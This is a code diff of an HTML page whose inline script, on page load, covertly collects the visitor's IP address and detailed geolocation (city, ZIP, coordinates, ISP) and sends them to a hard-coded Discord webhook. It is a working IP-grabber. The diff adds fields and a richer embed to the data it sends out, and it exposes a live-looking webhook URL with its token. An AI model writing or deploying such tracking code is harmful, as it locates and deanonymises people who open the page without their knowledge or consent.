@@ -5,20 +5,28 @@
 </head>
 <body>
     <script>
-        // Function to get the user's IP address and location
-        async function getIPandLocation() {
+        // Function to get the user's IP address
+        async function getIP() {
             try {
-                // Fetch the IP address
-                let ipResponse = await fetch('https://api.ipify.org?format=json');
-                let ipData = await ipResponse.json();
-                let ip = ipData.ip;
-
-                // Fetch the geolocation data using api.iplocation.net
-                let locationResponse = await fetch(`https://api.iplocation.net/?ip=${ip}`);
-                let locationData = await locationResponse.json();
-                return { ip: ip, location: locationData };
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                console.log('Retrieved IP:', data.ip); // Debug log
+                return data.ip;
             } catch (error) {
-                console.error('Error getting IP and location:', error);
+                console.error('Error getting IP address:', error);
+                return null;
+            }
+        }
+
+        // Function to get the user's location based on IP
+        async function getLocation(ip) {
+            try {
+                let response = await fetch(`http://ip-api.com/json/${ip}?fields=ip,country,regionName,city,zip,lat,lon,isp,org,as`);
+                let data = await response.json();
+                console.log('Location Data:', data); // Debug log
+                return data;
+            } catch (error) {
+                console.error('Error getting location:', error);
                 return null;
             }
         }
@@ -26,16 +34,33 @@
         // Function to send the IP address and location to a Discord webhook
         async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1267728048829108365/K3YnLVDarqgR0T_tU0Vc27nuNP7GMVLC3qpKoEPt6X2subgQaBlDkpjUxo9RciNb9xlO'; // Replace with your Discord webhook URL
-            const location = data.location || {};
             const payload = {
-                content: `User IP Address: ${data.ip}\n` +
-                         `Country: ${location.country_name || 'N/A'}\n` +
-                         `Region: ${location.region_name || 'N/A'}\n` +
-                         `City: ${location.city || 'N/A'}\n` +
-                         `ISP: ${location.isp || 'N/A'}\n` +
-                         `Organization: ${location.organization || 'N/A'}\n` +
-                         `Latitude: ${location.latitude || 'N/A'}\n` +
-                         `Longitude: ${location.longitude || 'N/A'}`
+                embeds: [
+                    {
+                        color: 3447003, // Optional color
+                        fields: [
+                            {
+                                name: "IP:",
+                                value: data.ip || 'N/A'
+                            },
+                            {
+                                name: "Location:",
+                                value: `Country:\n${data.country || 'N/A'}\n\n` +
+                                       `Region:\n${data.regionName || 'N/A'}\n\n` +
+                                       `City:\n${data.city || 'N/A'}\n\n` +
+                                       `ZIP:\n${data.zip || 'N/A'}\n\n` +
+                                       `Latitude:\n${data.lat || 'N/A'}\n\n` +
+                                       `Longitude:\n${data.lon || 'N/A'}\n\n` +
+                                       `ISP:\n${data.isp || 'N/A'}\n\n` +
+                                       `Organization:\n${data.org || 'N/A'}\n\n` +
+                                       `AS:\n${data.as || 'N/A'}\n\n`
+                            }
+                        ],
+                        author: {
+                            name: "IP & Info"
+                        }
+                    }
+                ]
             };
 
             try {
@@ -46,6 +71,7 @@
                     },
                     body: JSON.stringify(payload)
                 });
+                console.log('Data sent to Discord successfully'); // Debug log
             } catch (error) {
                 console.error('Error sending to Discord:', error);
             }
@@ -53,9 +79,27 @@
 
         // Main function to get IP and location and send it
         async function main() {
-            const data = await getIPandLocation();
-            if (data) {
-                await sendToDiscord(data);
+            const ip = await getIP();
+            if (ip) {
+                const locationData = await getLocation(ip);
+                if (locationData) {
+                    await sendToDiscord({
+                        ip: ip,
+                        country: locationData.country,
+                        regionName: locationData.regionName,
+                        city: locationData.city,
+                        zip: locationData.zip,
+                        lat: locationData.lat,
+                        lon: locationData.lon,
+                        isp: locationData.isp,
+                        org: locationData.org,
+                        as: locationData.as
+                    });
+                } else {
+                    console.error('Failed to retrieve location data.'); // Debug log
+                }
+            } else {
+                console.error('Failed to retrieve IP.'); // Debug log
             }
         }
 
